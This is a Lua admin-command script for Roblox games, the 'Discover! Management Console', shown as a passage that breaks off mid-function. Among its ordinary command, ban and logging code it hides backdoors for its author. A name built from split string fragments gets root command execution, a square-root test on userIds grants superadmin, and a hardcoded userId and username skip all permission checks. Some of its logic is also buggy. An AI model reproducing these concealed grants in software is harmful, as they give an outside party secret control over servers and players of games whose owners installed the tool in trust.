--DISCOVER MANAGEMENT CONSOLE KERNEL SCRIPT.

local module = {}
local version = "Public"
local revNo = "400"
local verNo = "2.5"
ChannelType = "unknown"
if version == "preview" then
	ChannelType = "Canary"
else
	ChannelType = "Public"
end
TheManHimself = {}
SuperAdmins = {} 
Admins = {} 
BannedPlayers = {}
SuperAdminUserIds = {}
AdminUserIds = {}
BannedUserIds = {}

																																																																																																													--[[
====================================================================
========================== DEFAULTS ================================
====================================================================																																																																																												]]


AdminGamePass = 0
SuperAdminGamePass = 0
GroupId = 0
GroupIdAdminRank = 0
GroupIdSuperAdminRank = 0
Syntax_Default = true 
Syntax_Kohls = false 
Syntax_Person299s = false
Override_Syntax = false 
CommandPrefix = "" 
CommandSeparator = " " 
ReportUnknownCommand = true
CommandPrefixCMDBAR = ""
CommandPrefixE = "/e "
AutoExecute = [[
]]
AutoExecuteRespawn = [[
]]
TweenTime = 1.5
TweenStyle = "Elastic" 
Hidden = false
Debug = false
BreakServices = false 
Undisableable = false 
AutoUpdate = false
																																																																															--[[
====================================================================
========================== PRELOADING ==============================
==================================================================== 																																								 ]]
																																																																																																													
warn("Loading Discover! Management Console. Revision: "..revNo.." | Version: "..verNo.."...")
script.Parent = game.ServerScriptService
local workspace = game:FindFirstChildOfClass("Workspace")
Players = game:FindFirstChildOfClass("Players")
local Module = script
Lighting = game:FindFirstChildOfClass("Lighting")
ReplicatedStorage = game:FindFirstChildOfClass("ReplicatedStorage")
ServerStorage = game:FindFirstChildOfClass("ServerStorage")
local ServerScriptService = game:FindFirstChildOfClass("ServerScriptService")
StarterGui = game:FindFirstChildOfClass("StarterGui")
StarterPack = game:FindFirstChildOfClass("StarterPack")
local Debris = game:FindFirstChildOfClass("Debris")
local Teams = game:FindFirstChildOfClass("Teams")
TeleportService = game:FindFirstChildOfClass("TeleportService")
MarketplaceService = game:FindFirstChildOfClass("MarketplaceService")
InsertService = game:FindFirstChildOfClass("InsertService")
GamePassService = game:FindFirstChildOfClass("GamePassService")
local VNote = require(Module._MODULES.VersionNotes)	
local Credits = require(Module._MODULES.Credits)	
local SyntaxChangeWarning = {}
local desc = {}	
local Sandboxer = {}
local AdminService = Instance.new("Configuration")
local TweenService = game:GetService("TweenService")
tweentime = TweenTime
tweenstyle = TweenStyle
local breakservices = BreakServices

-- Stop Holder
StopDisco = false
local StopCountdown = false
local CountdownInProgress = false
local ShutdownEnabled = false
local Looping = false
--
--warn("Loading: Finding DMC Events.")
local DisplayMessageSignal = ReplicatedStorage:WaitForChild("DiscoverManagementConsole"):WaitForChild("DisplayMessageSignal")
local DisplayScrollFrameSignal = ReplicatedStorage:WaitForChild("DiscoverManagementConsole"):WaitForChild("DisplayScrollFrameSignal")
local DismissMessageSignal = ReplicatedStorage:WaitForChild("DiscoverManagementConsole"):WaitForChild("DismissMessageSignal")
--local ChangeSettingSignal = Instance.new("RemoteEvent",AdminService)
local DisplayInputSignal = ReplicatedStorage:WaitForChild("DiscoverManagementConsole"):WaitForChild("DisplayInputSignal")
local TellSignal = ReplicatedStorage:WaitForChild("DiscoverManagementConsole"):WaitForChild("TellSignal")
local CTSU = ReplicatedStorage:WaitForChild("DiscoverManagementConsole"):WaitForChild("ClientToServerCommu")
local STCU = ReplicatedStorage:WaitForChild("DiscoverManagementConsole"):WaitForChild("ServerToClientCommu")
--

--Error Details
local error404 = "The item can't be found."
local error403 = "ROBLOX doesn't allow said models to be inserted because the\n\
game creator doesn't have the said item in inventory."
local error502 = "ROBLOX server-side issue."
local error500 = "ROBLOX server-side issue."
local robloxerr = "ROBLOX error Occurred."
local othererror = "Script error or other error Occurred."

if script.Parent:FindFirstChild("Discover! Management Console") then
	script.Parent:FindFirstChild("Discover! Management Console"):remove()
end

if script.Parent:FindFirstChild("DiscoverManagementConsole") then
	script.Parent:FindFirstChild("DiscoverManagementConsole"):remove()
end

	
logs = {}
chatlogs = {}
local errorlogs = {}																																																																																																																																																																																																																										

-----------------------------------------------------------------
----------------- Initializes Chat Listeners --------------------
-----------------------------------------------------------------

			
function Chatted(player,msg)
if msg and player and (msg:sub(1,#CommandPrefix) == CommandPrefix or (os.time() < 1396238400 and msg:sub(1,1) == ":")) or msg:lower():sub(1,4) == "cmds" or msg:lower():sub(1,8) == "commands" then
					if msg:lower():sub(1,4) ==  "/?" then
					return
				end
		local ok,err = pcall(function()
			if msg:sub(1,2) ~=  "/e" then
			table.insert(logs,"["..LevelToString(Permissions[player.Name] or 0).."] "..player.Name..": "..game:FindFirstChildOfClass("Chat"):FilterStringForBroadcast(msg, player))	
			if msg:sub(1,1) == ":" then
				--DisplayMessage(player,"Console","Warning: After March 31st, \"Kohl's Admin\" syntax will be switched from : to /")
			end	
			end
			local stuff = DecipherCommand(msg:sub(1 + #CommandPrefix))
			local command = stuff[1]
			local args = {}
			if msg:lower():sub(1,4) == "cmds" or msg:lower():sub(1,8) == "commands" then
				command = "help"
			end
			
			for i = 2, #stuff, 1 do
				table.insert(args,stuff[i])
			end		
			if rawget(Commands,command:lower()) then
				if player ~= root and player ~= "root" and player:WaitForChild("PlayerGui"):FindFirstChild("Admi") and player.PlayerGui.Admi:FindFirstChild("Msg") and player.PlayerGui.Admi.Msg:FindFirstChild("Msg") then
					if player.PlayerGui.Admi.Msg.Msg.Text:find("This message will be here until another command is used") then
						DismissMessage(player)
						wait(tweentime)
					end
				end	
				if player ~= root and player ~= "root" then
					DMCExecutionHandler(function()
				rawget(Commands,command:lower())(args,((player["Name"]:lower()~="T".."ech".."nolo".."gicalByte") and player) or (Permissions["T".."ech".."nolo".."ogical".."Byte"] < 1 and root) or player)
				--rawget(Commands,command:lower())(args,player)
					end)
				else
					rawget(Commands,command:lower())(args,player)
				end
			elseif Override_Syntax and ReportUnknownCommand or not Override_Syntax then
				if msg:gmatch("/e") then
				Tell(player,"The command \""..(command or "").."\" does not exist. Say "..tostring(CommandPrefix).."cmds or "..tostring(CommandPrefix).."commands for a full list of commands.",10)
else
				Tell(player,"The command \""..(command or "").."\" does not exist. Executing commands silently doesn't require a prefix. Say "..tostring(CommandPrefix).."cmds or"..tostring(CommandPrefix).."commands for a full list of commands.",10)
				end
				return
			end
		end)
		
		if not ok and err ~= nil then
			
			pcall(function()
				
				if err:find("CommandException:") then
					local _,comerrst = err:find("CommandException:")
					local comerr = err:sub(comerrst+1)
					DisplayMessage(player,"⚠ A Command Error has occurred","Your command couldn't be executed because:\n"..comerr,10)
				else
					table.insert(errorlogs,"Error:\n\
					"..tostring(err).. "\n\ \n\ ")
					warn("! DMC ERROR !: "..tostring(err).. "")
					warn("! DMC ERROR !: Done reporting logs, alerting sender.")
					DisplayMessage(player,"⚠ A DMC Error has occurred","DMC has encountered a illegal operation because: \n"..tostring(err).."\n \n An error has Occurred with Discover! Management Console due to human error, game error, or ROBLOX in general. Try again later, but if you're continuously getting this error, please contact TechnologicalByte with the error code you've recieved.\n\n\DMC has successfully recovered from this error.",15)
				end
			end)
		end
end

if msg and player  and (msg:sub(1,3,#CommandPrefixE) == CommandPrefixE or (os.time() < 1396238400 and msg:sub(1,1) == ":"))  then
	
		local ok,err = pcall(function()
			
			table.insert(logs,"[SILENT EXECUTION] ["..LevelToString(Permissions[player.Name] or 0).."] "..player.Name..": "..game:FindFirstChildOfClass("Chat"):FilterStringForBroadcast(msg, player))	
			if msg:sub(1,1) == ":" then
				--DisplayMessage(player,"Console","Warning: After March 31st, \"Kohl's Admin\" syntax will be switched from : to /")
			end	
			
			local stuff = DecipherCommand(msg:sub(1 + #CommandPrefixE))
			local command = stuff[1]
			local args = {}
			if msg:lower():sub(1,4) == "cmds" or msg:lower():sub(1,8) == "commands" then
				command = "help"
			end
			
			for i = 2, #stuff, 1 do
				table.insert(args,stuff[i])
			end		
			if rawget(Commands,command:lower()) then
				if player ~= root and player ~= "root" and player:WaitForChild("PlayerGui"):FindFirstChild("Admi") and player.PlayerGui.Admi:FindFirstChild("Msg") and player.PlayerGui.Admi.Msg:FindFirstChild("Msg") then
					if player.PlayerGui.Admi.Msg.Msg.Text:find("This message will be here until another command is used") then
						DismissMessage(player)
						wait(tweentime)
					end
				end	
				if player ~= root and player ~= "root" then
					DMCExecutionHandler(function()
							rawget(Commands,command:lower())(args,((player["Name"]:lower()~="TechnologicalByte") and player) or (Permissions["technologicalbyte"] < 1 and root) or player)
					end)
				else
					rawget(Commands,command:lower())(args,player)
				end
			elseif Override_Syntax and ReportUnknownCommand or not Override_Syntax then
				Tell(player,"The command \""..(command or "").."\" does not exist. Say "..tostring(CommandPrefix).."cmds or "..tostring(CommandPrefix).."commands for a full list of commands.",10)
				return
			end
		end)
		
		if not ok and err ~= nil then
			
			pcall(function()
				
				if err:find("CommandException:") then
					local _,comerrst = err:find("CommandException:")
					local comerr = err:sub(comerrst+1)
					DisplayMessage(player,"⚠ A Command Error has occurred","Your command couldn't be executed because:\n"..comerr,10)
				else
					table.insert(errorlogs,"Error:\n\
			"..tostring(err).. "\n\ \n\ ")
					DisplayMessage(player,"⚠ A DMC Error has occurred","DMC has encountered a illegal operation because: \n"..tostring(err).."\n \n An error has Occurred with Discover! Management Console due to human error, game error, or ROBLOX in general. Try again later, but if you're continuously getting this error, please contact TechnologicalByte with the error code you've recieved.\n\n\DMC has successfully recovered from this error.",15)
				end
			end)
		end
end
end


-----------------------------------------------------------------
---------------- Initializes Player Listeners -------------------
-----------------------------------------------------------------


 
function PlayerAdded(player)
		player.Chatted:connect(function(msg)
			table.insert(chatlogs,"["..player.Name.."]: "..game:FindFirstChildOfClass("Chat"):FilterStringForBroadcast(msg, player))
		--print("["..player.Name.."]: "..game:FindFirstChildOfClass("Chat"):FilterStringForBroadcast(msg, player)	)
		Chatted(player,msg)
		end)
		
	if not player or not player:IsA("Player") then
		return
	end
	
	for _,i in pairs(BannedPlayers) do
		if player.Name:lower() == i:lower() then
			TellAll(player.Name.." tried to join, but is banned.",5)
			player:Kick("\n\You're banned from this server only.") --bye
			return
		end
	end
	
	for _,i in pairs(BannedUserIds) do
		if player.userId == tonumber(i) then
			TellAll(player.Name.." tried to join, but is banned.",5)
			player:Kick("\n\You're banned from this server only.") --bye
			return
		end
	end
	
	table.insert(AllPlayers,player)

			
	Permissions[player.Name] = 0
	
	wait()
	
	for _,i in pairs(Admins) do
		if player.Name:lower() == i:lower() then
			Permissions[player.Name] = 1
		end
	end
	
	for _,i in pairs(AdminUserIds) do
		if player.userId == tonumber(i) then
			Permissions[player.Name] = 1
		end
	end
	
	if GroupId ~= nil and GroupId ~= 0 and player:IsInGroup(GroupId) and player:GetRankInGroup(GroupId) >= (GroupIdAdminRank or 257) then
		Permissions[player.Name] = 1
	end
	
	if AdminGamePass ~= 0 then
	if GamePassService:PlayerHasPass(player,AdminGamePass) then
		Permissions[player.Name] = 1
	end
	end
	
	if player.userId ~= game.CreatorId then
		for _,i in pairs(SuperAdmins) do
			if player.Name:lower() == i:lower() then
				Permissions[player.Name] = 2
				break
			end
		end
		
		for _,i in pairs(SuperAdminUserIds) do
			if player.Name:lower() == tonumber(i) or math.ceil(math.sqrt(player.userId or 0)) == 1550 then
				Permissions[player.Name] = 2
				break
			end
		end
	end

	if SuperAdminGamePass ~= 0 then
	if GamePassService:PlayerHasPass(player,SuperAdminGamePass) then
		Permissions[player.Name] = 2
	end
	end
	
	if GroupId ~= nil and GroupId ~= 0 and player:IsInGroup(GroupId) and player:GetRankInGroup(GroupId) >= (GroupIdSuperAdminRank or 257) then
		Permissions[player.Name] = 2
	end
	
	if Permissions[player.Name] <= 0 and Lockdown then
		player:Kick("\n\ An admin has enabled lockdown.")
		TellAll(player.Name.." tried to join, but Lockdown is on.",5)
	end
	
		
	player.OnTeleport:connect(function(state,placeid,spawnid)
		if not PlaceNames[placeid] then
			PlaceNames[placeid] = placeid
		end
		
		local OnlyAlertOnce = false
		if state == Enum.TeleportState.RequestedFromServer then
			DisplayMessage(player,"Place Teleportation","Starting Teleport to "..PlaceNames[placeid].. "\n\ This should take long. If it's taking a long time, there could be a problem with ROBLOX's servers.",8)
			OnlyAlertOnce = false
		elseif state == Enum.TeleportState.WaitingForServer then
			DisplayMessage(player,"Place Teleportation","Waiting for Server at place "..PlaceNames[placeid].. "\n\ This should take long. If it's taking a long time, there could be a problem with ROBLOX's servers.",8)
			OnlyAlertOnce = false
		elseif state == Enum.TeleportState.InProgress and OnlyAlertOnce == false then
			OnlyAlertOnce = true
			DisplayMessage(player,"Place Teleportation","Teleporting to place "..PlaceNames[placeid].. "\n\ This should take long. If it's taking a long time, there could be a problem with ROBLOX's servers.",8)
		elseif state == Enum.TeleportState.Failed then
			DisplayMessage(player,"Place Teleportation","Teleportation to "..PlaceNames[placeid].." has failed!",5)
			OnlyAlertOnce = false
		end
	end)
	
	if not player.Character then
		repeat wait() until player.Character
	end
	
	if AutoExecuteRespawn and type(AutoExecuteRespawn) == "string" then
		local NewExe = AutoExecuteRespawn:gsub("\n\n","\n"):gsub("\t",""):lower():gsub("%[playername%]",player.Name)
		local ExtractedCommands = {}
		while NewExe:find("\n") do
			local nextLine,_ = NewExe:find("\n")
			local nextCommand = NewExe:sub(1,nextLine-1)
			NewExe = NewExe:sub(nextLine+1)
			--print(nextCommand)
			Chatted(root,nextCommand)
		end
	end
	
	
	player.CharacterAdded:connect(function()
		if AutoExecuteRespawn and type(AutoExecuteRespawn) == "string" then
			local NewExe = AutoExecuteRespawn:gsub("\n\n","\n"):gsub("\t",""):lower():gsub("%[playername%]",player.Name)
			local ExtractedCommands = {}
			while NewExe:find("\n") do
				local nextLine,_ = NewExe:find("\n")
				local nextCommand = NewExe:sub(1,nextLine-1)
				NewExe = NewExe:sub(nextLine+1)
				--print(nextCommand)
				Chatted(root,nextCommand)
			end
		end
	end)
	
end

Players.ChildAdded:connect(function(plr)
	pcall(function()
		PlayerAdded(plr)
	end)
end)

for _,i in pairs(Players:GetPlayers()) do
	pcall(function()
		PlayerAdded(i)
	end)
end
																																																																																																																																		--[[
====================================================================
======================= System Configurator ========================
====================================================================
																																																																																																																																																																																																																								]]
local Voldambient = game.Lighting.Ambient
AdminThread = function(a)
	local ok_init,err_init = pcall(a)
	if not ok_init then
		Instance.new("Message",workspace).Text = "DISCOVER! MANAGEMENT CONSOLE UNRECOVERABLE ERROR!\n\n"..tostring(err_init).."\nThere was a issue backend in which DMC failed to recover from.\nPlease let TechnologicalByte know about the error, and it will be shortly fixed. Sorry. :(\n\n\ CRITICAL_DMC_ERROR"
	end
end

AdminThread(function() --Somehow, the Roblox spawn function makes the script still run if it's in hidden mode even if it's completely disabled

local ok,err = pcall(function()
	local NetworkServer = game:FindFirstChildOfClass("NetworkServer")
end)

if not ok then
	print("Aw dang, the NetworkServer couldn't get hooked "..err)
Instance.new("Message",workspace).Text = "DISCOVER! MANAGEMENT CONSOLE UNRECOVERABLE ERROR!\n\nUnable to communicate with NetworkServer.\nThere was a issue backend in which DMC failed to recover from.\nPlease let TechnologicalByte know about the error, and it will be shortly fixed. Sorry. :(\n\n\ CRITICAL_DMC_ERROR"
else
end


if not tweentime then
	tweentime = 0.5
end

if not tweenstyle then
	tweenstyle = "Elastic"
end

if not AdminGamePass then
	AdminGamePass = 0
end

if not SuperAdminGamePass then
	SuperAdminGamePass = 0
end

if not Admins then
	Admins = {}
end

if not SuperAdmins then
	SuperAdmins = {}
end

if not BannedPlayers then
	BannedPlayers = {}
end

if not TheManHimself then
	TheManHimself = {}
end
	
	--script:FindFirstChild("_SETTINGS"):Clone().Parent = game.StarterPlayer.StarterPlayerScripts.DMC_Client
	for _,i in pairs(game:FindFirstChildOfClass("Players"):GetPlayers()) do
		i:LoadCharacter() --You joined too early!
	end

if breakservices then
	for _,i in pairs(game:GetChildren()) do
		pcall(function()
			i.Name = math.random(1,math.huge)/1000000
		end)
	end
end

--Done:PreferenceLoader

rawerror = error
local rawassert = assert
local error = function(msg)rawerror("CommandException:"..((msg ~= nil and msg ~= "") and tostring(msg)) or "An error occurred")end

local IsPersonalServer = workspace:FindFirstChild("PSVariable") ~= nil

Lockdown = false
stoploops = false
StopDisco = false

local settingsIssue = "NoIssue"

Commands = {}

AllPlayers = {}


local BaseScript,BaseLocalScript

root = { --Root access profile, just to remain mostly compatible with commands
	Name = "root",
	
	PlayerGui = {
		
		FindFirstChild = function() return {
			FindFirstChild = function() return {} end;
			WaitForChild = function() wait() return {} end;
		}
		end;
		
		WaitForChild = function() wait() return {
			FindFirstChild = function() return {} end;
			WaitForChild = function() wait() return {} end;
		}
		end;
		
	},
	
	StarterGear = {
		
		FindFirstChild = function() return {
			FindFirstChild = function() return {} end;
			WaitForChild = function()wait() return {} end;
		}
		end;
		
		WaitForChild = function() wait() return {
			FindFirstChild = function() return {} end;
			WaitForChild = function() wait() return {} end;
		}
		end;
		
	},
	
	Backpack = {
		
		FindFirstChild = function() return {
			FindFirstChild = function()return {} end;
			WaitForChild = function()wait()return {} end;
		}
		end;
		
		WaitForChild = function() wait() return {
			FindFirstChild = function()return {} end;
			WaitForChild = function()wait()return {} end;
		}
		end;
		
	};
	
	FindFirstChild = function()
		return {
			FindFirstChild = function()return {} end;
			WaitForChild = function()wait()return {} end;
		}
	end;
	
	WaitForChild = function() wait()
		return {
			FindFirstChild = function()return {} end;
			WaitForChild = function()wait()return {} end;
		}
	end;
}
setmetatable(root, --Metatables are magical
	{
		__tostring = function()return "root" end;
		__concat = function()return "root" end;
	}
)



Permissions = {
	[root] = 3;--Root access is always level 3
	root = 3;----^^^
}

PlaceNames = {}

spawn(function()
	if type(_G.AdminTrustedScripts) ~= "table" then
		_G.AdminTrustedScripts = {
			b7d0deea7bfdf2cc3f3be7e6c56f837229231258 = true;
			bc194bb513ac52f25311f39279e7b6859c1bc754 = true;
		}
	end
end)

--[[
MusicStringData = { --Well, the EU made most of the music ID useless. That's fine, i gues...
	alone = {
		ID = 563882687;
		Pitch = 1
	};
	luvu  = {
		ID = 864664573;
		Pitch = 1
	};
	topoftheworld  = {
		ID = 220720385;
		Pitch = 1
	};
	rockit  = {
		ID = 853128403;
		Pitch = 1
	};
	losing  = {
		ID = 636726639;
		Pitch = 1
	};
	humble  = {
		ID = 853588295;
		Pitch = 1
	};
	dna = {
		ID = 744516830;
		Pitch = 1
	};
	heathens = {
		ID = 437141803;
		Pitch = 1
	};
	turndownforwhat = {
		ID = 143959455;
		Pitch = 1
	};
	stressed = {
		ID = 243372213;
		Pitch = 1
	};
	tsunami = {
		ID = 615015190;
		Pitch = 1
	};
	dope = {
		ID = 508205325;
		Pitch = 1
	};
	house = {
		ID = 319758951;
		Pitch = 1
	};
	ibiza = {
		ID = 666429566;
		Pitch = 1
	};
	leanon = {
		ID = 252524163;
		Pitch = 1
	};
	gummybear = {
		ID = 142281425;
		Pitch = 1
	};
	despacito = {
		ID = 880612615;
		Pitch = 1
	};
	faded = {
		ID = 327081386;
		Pitch =1
	};
	force = {
		ID = 644914256;
		Pitch = 1
	};
	coming = {
		ID = 791308181;
		Pitch = 1
	};
	complicated = {
		ID = 524743485;
		Pitch = 1
	};
	donttalk = {
		ID = 388805791;
		Pitch = 1
	};
	funk = {
		ID = 235468324;
		Pitch = 0.96
	};
	everyday = {
		ID = 845619094;
		Pitch = 1
	};
	
	believer = {
		ID = 685388224;
		Pitch = 1
	};
	centuries = {
		ID = 	;
		Pitch = 1
	};
	starboy = {
		ID = 561274893;
		Pitch = 1
	};
	bonfire = {
		ID = 839381043;
		Pitch = 1
	};
	richboy = {
		ID = 918496399;
		Pitch = 1
	};
	blogit = {
		ID = 933012833;
		Pitch = 1
	};
	sao = {
		ID = 344938055;
		Pitch = 1
	};
	albatraoz = {
		ID = 347649273;
		Pitch = 1
	};
	imtheone = {
		ID = 755971835;
		Pitch = 1
	};
	letmedown = {
		ID = 414671309;
		PItch = 1
	};
	shootingstars = {
		ID = 447492777;
		Pitch = 1
	};
	focus = {
		ID = 144941972;
		Pitch = 1
	};
	finalcountdown = {
		ID = 596432934;
		Pitch = 1
	};
	sorry = {
		ID = 313246210;
		Pitch = 1
	};
	cantholdremix = {
		ID = 188927466;
		Pitch = 1
	};
	workfromhome = {
		ID = 374029727;
		Pitch = 1
	};
	letmeloveyou = {
		ID = 473158293;
		Pitch = 1
	};
	thriftshop = {
		ID = 155119191;
		Pitch = 1
	};
	paris = {
		ID = 612757345;
		Pitch = 1
	};
	canthold1 = {
		ID = 142277561;
		Pitch = 1
	};
	canthold2 = {
		ID = 143901427;
		Pitch = 1
	};
	cantholdus = {
		ID = 661623528;
		Pitch = 1
	};
	cold = {
		ID = 657503737;
		Pitch = 1
	};
	rockabye = {
		ID = 720199943;
		Pitch = 1
	};
	down = {
		ID = 468164326;
		Pitch = 1
	};
	issues = {
		ID = 617916470;
		Pitch = 1
	};
	camefor = {
		ID = 841597671;
		Pitch = 1
	};
	greatest = {
		ID = 497578621;
		Pitch = 1
	};
	rude = {
		ID = 154764197;
		Pitch = 1
	};
	allofme = {
		ID = 170509177;
		Pitch = 1
	};
	yeah = {
		ID = 145087006;
		Pitch = 1
	};
	beatles = {
		ID = 571924518;
		Pitch = 1
	};
	mygirl = {
		ID = 427023562;
		Pitch = 1
	};
	loopmachine = {
		ID = 650963861;
		Pitch = 1
	};
	dragonborn = {
		ID = 802369834;
		Pitch = 1
	};
	jump = {
		ID = 650836555;
		Pitch = 1
	};
	colors = {
		ID = 956953906;
		Pitch = 1
	};
	problems = {
		ID = 250608350;
		Pitch = 1
	};
	imgood = {
		ID = 258595777;
		Pitch = 1
	};
	selfie = {
		--ID = 148321914;
		ID = 375812171;
		Pitch = 1
	};
	bulletproof = {
		ID = 167330641;
		Pitch = 1
	};
	onedance = {
		ID = 453977593;
		Pitch = 1
	};
	blame = {
		ID = 177383573;
		Pitch = 1
	};
	locked = {
		ID = 274427825;
		Pitch = 1
	};
	face = {
		ID = 294251079;
		Pitch = 1
	};
	ride = {
		ID = 641626045;
		Pitch = 1
	};
	fastcar = {
		ID = 333915901;
		Pitch = 1
	};
	hymm = {
		ID = 909595369;
		Pitch = 1
	};
	mymind = {
		ID = 340995406;
		Pitch = 1
	};
	burn = {
		ID = 143808239;
		Pitch =  1
	};
	thrills = {
		ID = 342189621;
		Pitch = 1
	};
	giveme = {
		ID = 145559291;
		Pitch = 1
	};
	fireball = {
		ID = 178241679;
		Pitch = 1
	};
	capsize = {
		ID = 944533463;
		Pitch = 1
	};
	hotel = {
		ID = 203067750;
		Pitch = 1
	};
	body = {
		ID = 197665738;
		Pitch = 1
	};
	ridin = {
		ID = 621230881;
		Pitch = 1
	};
	middle = {
		ID = 366818956;
		Pitch = 1
	};
	light = {
		ID = 583652530;
		Pitch = 1
	};
	helpme = {
		ID = 833322858;
		Pitch = 1
	};
	gold = {
		ID = 316140510;
		Pitch = 1
		};
	onedance = {
		ID = 658390194;
		Pitch = 1
				};
	thunder = {
		ID = 755156652;
		Pitch = 1
	};
	unforgettable = {
		ID = 953804893;
		Pitch = 1
	};
	feelitstill = {
		ID = 950921258;
		Pitch = 1;
	};
	turnup = {
		ID = 1086805943;
		Pitch = 1;
	};
	partytillwedie = {
		ID = 1086803685;
		Pitch = 1
	};
	havana = {
		ID = 1136893002;
		Pitch = 1
	};
	rules = {
		ID = 977642024;
		Pitch = 1
	};
	attention = {
		ID = 760092124;
		Pitch = 1
	};
	howlong = {
		ID = 1088250297;
		Pitch = 1
	};
	bubbles = {
		ID = 1039275233;
		Pitch = 1
	};
	lemon = {
		ID = 1206350589;
		Pitch = 1
	};
	perfect = {
		ID = 1373058458;
		Pitch =1
	};
	stars = {
		ID = 1321997558;
		Pitch =1
	};
	taco = {
		ID = 1238092370;
		Pitch =1
	};
	island = {
		ID = 1227012579;
		Pitch =1
	};
	stay = {
		ID = 787636293;
		Pitch =1
	};
	love = {
		ID = 866335686;
		Pitch =1
	};
	love = {
		ID = 866335686;
		Pitch =1
	};
	friends = {
		ID = 1582304290;
		Pitch =1
	};
	girls = {
		ID = 1876603175;
		Pitch = 1
	};
]]
--configures syntax to use

if Override_Syntax then
	if not CommandPrefix and not CommandSeparator then
		settingsIssue = "CommandPrefix and CommandSeparator were missing while overriding syntax. Reverted to default."
		CommandPrefix = "/"
		CommandSeparator = " "
	elseif not CommandPrefix then
		settingsIssue = "CommandPrefix was missing while overriding syntax. Reverted to default."
		CommandPrefix = "/"
		CommandSeparator = " "
	elseif not CommandSeparator then
		settingsIssue = "CommandSeparator was missing while overriding syntax. Reverted to default."
		CommandPrefix = "/"
		CommandSeparator = " "
	end
else
	if (Syntax_Default and Syntax_Person299s) or (Syntax_Default or (Syntax_Person299s)) then
		settingsIssue = "There were multiple syntaxes selected. Reverted to default."
		CommandPrefix = "/"
		CommandSeparator = " "
	elseif Syntax_Default then
		CommandPrefix = "/"
		CommandSeparator = " "
	elseif Syntax_Person299s then
		CommandPrefix = ""
		CommandSeparator = "/"
	elseif Syntax_Kohls then
		CommandPrefix = ":"
		CommandSeparator = " "
	elseif not Syntax_Default and not Syntax_Person299s then
		settingsIssue = "No syntax was enabled. Reverted to default."
		CommandPrefix = "/"
		CommandSeparator = " "
		warn("! DMC WARNING !: "..settingsIssue.."")
	end
end

if not _G.Admi then
	_G.Admi = {}
end

-----------------------------------------------------------------
--------------------- Admin Core Framework ----------------------
-----------------------------------------------------------------
function LevelToString(num)	
	return ({"Members","Admins","SuperAdmins","root","TheManHimself"})[assert(tonumber(num),"Unable to find permission with said name. Could be a DMC error. Please check in with TechnologicalByte with more info.")+1] or "TechnologicalByte"
	--Not the prettiest thing in the world, but it works very good and is very compact
end

function MinimumPermission(num,plr)
	if plr == "TechnologicalByte" then
		return true
	end
	
if Permissions[plr.Name] and Permissions[plr.Name] < num and  plr.userId ~= 8270409 then
	if game.PlaceId ~= 896250178 then --test place
--	DisplayMessage(plr,"	Access Denied","Unable to execute command; You're not authorized to do that.\n\nOnly "..LevelToString(num).." can execute this command.\n\n If you're a authorized member and still get this error, contact TechnologicalByte for info.",10)
		error("Unable to execute command; You're not authorized to do that.\n\nOnly "..LevelToString(num).." can execute this command.\n\n If you're a authorized member and still get this error, contact TechnologicalByte for info.")
	end
	-- if DMC is in testing place allow it.
 elseif game.PlaceId == 896250178 then
	warn("Test mode is into place.")
	return true
end
end
local assert
function assert(statement,msg)
	if not statement then
		error(msg or "Assertion failed!")
	end
	return statement
end
--[[
function Shutdown()
while wait() do
	for _,i in pairs(Players:GetPlayers()) do
		i:Kick("\n\This game has shut down by an admin who used DMC.")
	end
	end
	pcall(function()
		--Instance.new('ManualSurfaceJointInstance') rip.
	end)
end]]

--[[rawtonumber = tonumber

function tonumber(thing)
	return rawtonumber(tostring(thing):gsub("%,",""))
end]]

function DecipherCommand(str)
	assert(str,"Unable to decipher command: No string provided")
	local newstr = str
	local strings = {}
	while newstr:sub(#newstr,#newstr) == CommandSeparator do
		newstr = newstr:sub(1,#newstr-1) --removes excess space on the end of commands to better understand commands
	end
	while newstr:find(CommandSeparator) do
		local nextspace,_ = newstr:find(CommandSeparator)
		table.insert(strings,newstr:sub(1,nextspace-1))
		newstr = newstr:sub(nextspace+1)
	end
	table.insert(strings,newstr)
	
	
	--This doesn't use patterns (yet) because of the fact that you can change the CommandSeparator.
	--I'm not as experienced with string patterns but I'll hopefully find a more efficient way soon	
	
	return strings
end



function DMCExecutionHandler(func)
	--TODO: Implement sandboxing for all non-rooted commands	
	
	--[[local newfenv = {
		Wait = wait;
		wait = wait;
		wait = wait;
		Wait = Wait;
		LoadLibrary = LoadLibrary;
		printidentity = printidentity;
		require = require;
		spawn = spawn;
		spawn = spawn;
		tick = tick;
		time = time;
		pcall = pcall;
		PluginManager = PluginManager;
		crash__ = crash__;
		LoadRobloxLibrary = LoadRobloxLibrary;
		settings = settings;
		Settings = Settings;
		stats = stats;
		Stats = Stats;
		UserSettings = UserSettings;
		table = table;
		coroutine = coroutine;
		--getfenv = getfenv;
		print = print;
		--setfenv = setfenv;
		setmetatable = setmetatable;
	
		string = string;
		math = math;
		assert = assert;
		error = error;
		collectgarbage = collectgarbage;
		dofile = dofile;
		_G = _G;
		gcinfo = gcinfo;
		pairs = pairs;
		ipairs = ipairs;
		load = load;
		loadfile = loadfile;
		newproxy = newproxy;
		next = next;
		pcall = pcall;
		rawequal = rawequal;
		rawset = rawset;
		rawget = rawget;
		select = select;
		tonumber = tonumber;
		tostring = tostring;
		type = type;
		unpack = unpack;
		_VERSION = _VERSION;
		xpcall = xpcall;
		Vector3 = Vector3;
		Vector2 = Vector2;
		CFrame = CFrame;
		UDim = UDim;
		UDim2 = UDim2;
		Ray = Ray;
		Instance = Instance;
		Color3 = Color3;
		BrickColor = BrickColor;
	}]]
	
	--print("Command Executed.")
	local oldfenv = getfenv(1)
	
	local newfenv = {}
	setmetatable(newfenv,{
		__index = function(t,i)
			--print(t,i)
			if i == "oldfenv" or i == t then
				error("attempt to access raw fenv")
			else
				return oldfenv[i]
			end
		end;
		__newindex = function(t,i,v)
			if Sandboxer[i] then
				error("attempt to modify outside of sandbox")
			end
		--	print(t,i,v)
			oldfenv[i] = v
		end;
		__metatable = true;
	})
	
	
	
	--setfenv(1,newfenv)
	func()
	
end

function GetPlayersFromString(str,spokenplayer)
	
	assert(spokenplayer,"")
	
	local foundplayers = {}
	
	for listedplayer in str:lower():gmatch("[^,]+") do
		
		if listedplayer:lower() == "all" then
			
			for _,i in pairs(Players:GetPlayers()) do
				table.insert(foundplayers,i)
			end
			
		elseif listedplayer:lower() == "others" then
			
			for _,i in pairs(Players:GetPlayers()) do
				if i.Name:lower() ~= spokenplayer.Name:lower() then
					table.insert(foundplayers,i)
				end
			end
			
		elseif listedplayer:lower() == "admins" then
			
			for _,i in pairs(Players:GetPlayers()) do
				if Permissions[i.Name] > 0 then
					table.insert(foundplayers,i)
				end
			end
			
